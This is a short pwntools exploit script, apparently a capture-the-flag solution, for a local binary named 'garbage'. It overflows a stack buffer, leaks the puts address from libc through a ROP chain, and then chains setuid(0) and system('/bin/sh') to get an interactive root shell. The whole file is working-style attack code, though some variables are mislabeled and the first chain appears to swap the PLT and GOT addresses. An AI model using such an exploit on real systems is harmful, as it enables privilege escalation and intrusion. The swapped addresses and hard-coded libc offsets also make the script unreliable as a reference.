from pwn import *

p = process('./garbage')
#p = gdb.debug("./garbage", "b main")
e = ELF('./garbage')
# rop = ROP(e)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context(os='linux',arch='amd64')

junk = b"A"*136
pop_rdi = p64(0x40179b)
got_gets = p64(e.plt['printf'])
plt_put = p64(e.got['puts'])
plt_main = p64(e.symbols['main']) # Oppure con objdump -D, occhio a non prendere il primo (è quello della libc)


# Stage 1: Memory leak + return to main to execute again the vulnerable code
payload = junk + pop_rdi + got_gets + plt_put + plt_main

# send payload when the programs start
p.sendline(payload)
p.recvuntil(b"access denied.\n")
leaked_puts_address = u64(p.recvline()[:-1].ljust(8,b'\x00'))
print('Leaked put address 0x%x' % leaked_puts_address)
# Stage 2: Exploitation
libc_puts = 0x606f0
libc_system_offset = 0x50d70
libc_setuid_offset = 0xec0d
libc_sh_offset = 0x1d8678

#Base address
offset = leaked_puts_address - libc_puts
libc_system = p64(offset + libc_system_offset)
libc_sh = p64(offset + libc_sh_offset)
libc_setuid = p64(offset + libc_setuid_offset)
print("libc system: 0x%x" % u64(libc_system))
print("libc bin_sh: 0x%x" % u64(libc_sh))
ret_empty = p64(0x0401016)

# Without setuid I needed an empty ret to align the stack
# payload_stage = junk + ret_empty + pop_rdi + libc_sh + libc_system

payload_stage = junk + pop_rdi + p64(0) + libc_setuid + pop_rdi + libc_sh + libc_system
p.sendline(payload_stage)


p.interactive()